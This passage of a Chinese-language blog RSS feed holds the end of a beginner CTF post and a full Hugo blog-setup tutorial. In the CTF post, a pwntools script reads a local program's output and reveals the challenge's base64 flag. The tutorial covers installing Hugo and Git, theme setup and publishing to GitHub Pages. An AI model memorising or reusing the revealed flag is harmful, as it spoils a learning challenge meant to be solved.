&lt;span class=&#34;n&#34;&gt;Python&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.9.9&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Jan&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GCC&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;11.2.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;more&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;information&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;既然程序没有输入，只有输出，那么只有使用recv()或recvline()函数了qaq&lt;/p&gt;
&lt;p&gt;EXP:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./tools&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;整个过程展示:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt;                  
&lt;span class=&#34;n&#34;&gt;Python&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.9.9&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Jan&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GCC&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;11.2.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;more&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;information&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./tools&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Starting&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./tools&amp;#39;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Starting&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./tools&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;108320&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./tools&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stopped&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;108320&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pwntools is such an awesome python module, right?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Tell you a secret (only smart baby can see it) :&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Maybe I will tell you again when you clever than ELSEpush ......&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 169; 
			flex-basis: 405px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn2/pwned.png&#34; data-size=&#34;1138x673&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn2/pwned.png&#34;
			width=&#34;1138&#34;
			height=&#34;673&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn2/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn2/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;PWNed!&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;PWNed!&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;the-end-&#34;&gt;The END= =&lt;/h2&gt;
&lt;p&gt;To Be Continued&amp;hellip;&lt;/p&gt;
&lt;p&gt;突然发现自己真的挖了个好大的坑= ((&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Hugo无需服务器搭建个人博客</title>
        <link>https://kira-pgr.github.io/posts/hugo1/</link>
        <pubDate>Sat, 29 Jan 2022 02:02:45 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/hugo1/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/hugo1/cover.jpg" alt="Featured image of post Hugo无需服务器搭建个人博客" /&gt;&lt;h1 id=&#34;用github服务器免费搭建博客&#34;&gt;用GitHub服务器免费搭建博客&lt;/h1&gt;
&lt;h2 id=&#34;安装环境linux&#34;&gt;安装环境(Linux)&lt;/h2&gt;
&lt;h3 id=&#34;安装hugo&#34;&gt;安装Hugo&lt;/h3&gt;
&lt;p&gt;yum系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum install hugo -y
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Arch&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo pacman -S hugo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;deb系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt install hugo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;安装git系统已经预装的自行忽略&#34;&gt;安装Git(系统已经预装的自行忽略)&lt;/h3&gt;
&lt;p&gt;yum系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum install git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Arch&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo pacman -Syu git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;deb系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt install git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;安装环境windows&#34;&gt;安装环境(Windows)&lt;/h2&gt;
&lt;h3 id=&#34;安装hugo-1&#34;&gt;安装Hugo&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/getting-started/installing/#less-technical-users&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gohugo.io/getting-started/installing/#less-technical-users&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;安装git&#34;&gt;安装Git&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;winget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Git&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Git&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;开始建站uwu&#34;&gt;开始建站.UwU.!&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意：我本地环境是Kali Linux, 其他环境可能步骤略有不同= =&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;终端/cmd/&lt;del&gt;或者你用的其他东西也罢&lt;/del&gt;输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hugo new site 你想给网站起的名字
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候Hugo就给你生成了一个网站&lt;/p&gt;
&lt;p&gt;&lt;del&gt;接下来该犯选择综合征了&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;咳咳，接下来去https://themes.gohugo.io/ 找一个喜欢的主题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;P.S. 我的博客是主题&lt;a class=&#34;link&#34; href=&#34;https://github.com/CaiJimmy/hugo-theme-stack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Stack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;进入你本地hugo网站的&lt;strong&gt;themes&lt;/strong&gt;目录&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; 网站名/themes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后把你的主题放进去.qaq.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone 你的主题的GitHub网址.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等你的主题静静的躺在那里了之后 逃)，依据文档配置你的网站&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Stack的文档 &lt;a class=&#34;link&#34; href=&#34;https://docs.stack.jimmycai.com/zh/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://docs.stack.jimmycai.com/zh/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&#34;stack-主题的简单配置&#34;&gt;Stack 主题的简单配置&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;把&lt;code&gt;你的网站名/themes/hugo-theme-stack/exampleSite/&lt;/code&gt;目录下的config.yaml复制到网站根目录(也就是&lt;code&gt;你的网站名&lt;/code&gt;这个目录)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除网站根目录的&lt;code&gt;config.toml&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后打开网站根目录下的&lt;code&gt;config.yaml&lt;/code&gt;进行填空&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;几个Tip(踩过的坑):&lt;/p&gt;
&lt;p&gt;博主头像放在&lt;code&gt;/themes/hugo-theme-stack/assets/img/&lt;/code&gt;下&lt;/p&gt;
&lt;p&gt;关于那个头像下的emoji,如果你不想加上，emoji那一行留空就好&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;本地网站试运行&#34;&gt;本地网站试运行&lt;/h2&gt;
&lt;p&gt;在你的&lt;strong&gt;网站根目录&lt;/strong&gt;下打开终端/cmd/或者你喜欢的命令行工具&lt;/p&gt;
&lt;p&gt;输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;hugo server 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后就可以在本机浏览器输入&lt;code&gt;http://127.0.0.1:1313/&lt;/code&gt;看到你的网站啦qaq&lt;/p&gt;
&lt;h2 id=&#34;写博客&#34;&gt;写博客&lt;/h2&gt;
&lt;h3 id=&#34;关于markdown&#34;&gt;关于Markdown&lt;/h3&gt;
&lt;p&gt;写博客前先熟悉一下&lt;a class=&#34;link&#34; href=&#34;https://www.markdownguide.org/basic-syntax/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MarkDown语法&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;小Tip:可以用MarkText(一款开源markdown编辑工具)写Blog,会舒适很多&lt;/p&gt;
&lt;p&gt;(我就是用的这个工具写这篇文章的)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/marktext/marktext#download-and-installation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MarkText下载链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 152; 
			flex-basis: 365px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/hugo1/mt.png&#34; data-size=&#34;1202x789&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/hugo1/mt.png&#34;
			width=&#34;1202&#34;
			height=&#34;789&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/hugo1/mt_hu99887f49a078215fde631f4103a99e7f_89123_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/hugo1/mt_hu99887f49a078215fde631f4103a99e7f_89123_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;MarkText(禁止套娃)&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;MarkText(禁止套娃)&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;关于目录结构&#34;&gt;关于目录结构&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;你的文章是在&lt;code&gt;网站根目录/content/posts/&lt;/code&gt;下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;你的&amp;quot;分类&amp;quot;在&lt;code&gt;网站根目录/content/categories&lt;/code&gt;下&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;试着尝试一下吧qaq&#34;&gt;试着尝试一下吧qaq&lt;/h3&gt;
&lt;p&gt;首先我们要创建一个md文件&lt;/p&gt;
&lt;p&gt;在网站根目录打开终端/cmd/&amp;hellip;并输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;hugo new posts/随便一个名字/index.md
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后打开&lt;code&gt;index.md&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将预先生产好的内容更改成&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;---
title: &amp;#34;文章标题&amp;#34;
description: &amp;#34;简介&amp;#34;
date: 2022-01-29T02:02:45-05:00
image: &amp;#34;你同目录下的封面图片名字(带后缀并且是相对路径)&amp;#34;
categories:
    &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 分类1
    &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 分类2
tags:
    &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 标签1
    &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 标签2
---
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意：不同主题的格式可能不一样，如你没有使用Stack主题，快去查看文档&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之后就可以书写文章内容了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Tip:你引用的图片放在同目录下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;发布网站上github&#34;&gt;发布网站上GitHub&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;呼，完成这一步后，你的网站就可以公大家浏览了&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;注意：之后本地的环境不要丢，之后继续发布博客的时候还有用&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;github项目创建&#34;&gt;GitHub项目创建&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;注册/登录GitHub帐号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建一个名为&lt;code&gt;你的Github用户名.github.io&lt;/code&gt;的项目&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;放在那里备用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;发布网站&#34;&gt;发布网站&lt;/h3&gt;
&lt;p&gt;在网站根目录打开终端/cmd/等等，并输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;hugo --theme&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;主题文件夹名
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入public准备发布&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; public
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发布上GitHub&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git init
git add -A
git commit -m &lt;span class=&#34;s2&#34;&gt;&amp;#34;对这次发布的说明&amp;#34;&lt;/span&gt;
git remote add origin https://github.com/你的Github用户名/你的Github用户名.github.io.git
git push -u origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来输入你的用户名和你的GitHub&lt;strong&gt;个人访问Token(不是密码，帐号密码已经不支持了)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;申请Token方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;去设置-&amp;gt;开发者设置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;申请一个&lt;code&gt;Personal access tokens&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;发布成功后&#34;&gt;发布成功后&lt;/h2&gt;
&lt;p&gt;现在，这个网站就可以脱离本地环境供大家访问了&lt;/p&gt;
&lt;p&gt;链接: https://你的Github用户名.github.io/&lt;/p&gt;
&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.stack.jimmycai.com/zh/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
